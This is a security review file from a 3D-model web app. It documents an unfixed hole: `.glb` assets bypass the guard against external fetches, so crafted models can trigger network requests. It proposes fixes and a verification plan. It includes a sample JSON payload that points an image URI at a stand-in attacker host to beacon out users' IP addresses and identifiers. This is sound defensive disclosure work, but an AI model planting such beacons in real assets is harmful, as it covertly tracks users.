# Known Risks

Exposures found in review that are not yet fixed. Each section names what an
attacker could reach, the input or state that reaches it, and the mitigation.
A risk is removed from this file when the fix lands, not when it is queued.

## 2026-11-07: a `.glb` asset can make the page fetch a URL it names

### The exposure

`js/asset-loader.js` promises that a loaded model never causes a network
request. The module header says a `.gltf` is read "only when every buffer and
image it names is inside it as a `data:` address, since one file was given and
nothing is fetched", and `js/asset-fit.js` opens with "A model is read in the
page and never sent anywhere."

The guard that holds that promise is `selfContained`, and it is applied to one
of the two glTF formats:

```js
if (format === 'gltf') {
    source = text();
    if (!selfContained(JSON.parse(source))) throw new AssetRefused(...);
}
object = (await loader.parseAsync(source, '')).scene;
```

A `.glb` never reaches that branch. It goes straight to `parseAsync`. A GLB's
JSON chunk is ordinary glTF JSON, and the format allows every `uri` a `.gltf`
allows - only buffer 0 may be the embedded BIN chunk, and all other buffers and
all images may name an address of their own.

### What an attacker could reach

In `three@0.160.0`, the version `index.html` pins, `GLTFLoader` resolves and
fetches those addresses:

- `GLTFLoader.js:2948` - `loadBuffer` calls
  `loader.load(LoaderUtils.resolveURL(bufferDef.uri, options.path))` for any
  buffer that has a `uri`.
- `GLTFLoader.js:3247` - the image path does the same for any image source
  with a `uri`.

`options.path` is `''`, so an absolute `https://` address is fetched as given.

A `.glb` carrying

```json
{ "images": [ { "uri": "https://attacker.example/beacon.png" } ] }
```

makes the page request that URL when the model is read. That request carries
the pilot's IP address, their user agent, the time they opened the world, and
whatever the path encodes - a per-recipient identifier among the possibilities.
Nothing in the page tells the pilot it happened.

The reach is wider than one pilot's own file chooser, because **an environment
file carries its assets' bytes**. `assetForFile` writes each model as base64
into the document, and on the way back in `App.adoptAssets` hands every asset
to `registerAsset`, which calls `readModel`. So a shared environment file is an
untrusted input that reaches this path, and one crafted `.glb` inside it
beacons for every pilot who opens that world, every time they open it.

The SHA-256 check in `adoptAssets` does not help. It proves the bytes are the
bytes the file's author meant to ship; the author is the one who crafted them.

### Also worth correcting with it

- The refusal message steers the pilot to the format that bypasses the guard:
  "the glTF points at other files; save it as a .glb, or with its buffers
  inside it".
- `docs/terrain.html:320` repeats the narrow claim - "A `.gltf` must carry its
  buffers and images inside it; one pointing at other files is refused, since
  only one file was given and nothing is fetched."
- The only test is a source-text match in `test/assets.test.js:403` asserting
  the `gltf` branch's line exists. It cannot see that `.glb` has no such line.

### The mitigation

Hold both formats to the same rule. Two shapes to choose between:

1. **Read the GLB's JSON chunk and run `selfContained` on it** before parsing.
   A GLB is a 12-byte header then length-prefixed chunks, the first of which is
   the JSON; reading it is a few lines and needs no loader.
2. **Give the loader a `THREE.LoadingManager` with `setURLModifier`** that
   refuses any URL not beginning `data:`, for both formats. This covers
   whatever a future extension adds a `uri` to rather than the two lists
   `selfContained` knows about, and fails closed: the refused load surfaces as
   a parse failure, which `readModel` already turns into `AssetRefused`.

Option 2 is the recommendation - it is the smaller change and it does not
depend on keeping a list of URI-bearing fields in step with the spec.

Either way the comparison should be case-insensitive on the scheme. `data:` is
matched with `startsWith`, so a valid `DATA:` URI is read as external today.
That direction fails closed and is not itself a risk, but it is wrong.

### Verification

Not fixed here because it cannot be verified in this repository as it stands:
`three` is loaded from a CDN with no local install, and `readModel` has no test
that executes it. A fix needs either a vendored `three` for Node or a Chromium
check that serves a crafted `.glb` and asserts no request leaves the page -
which is the harness the builder's other work already uses.
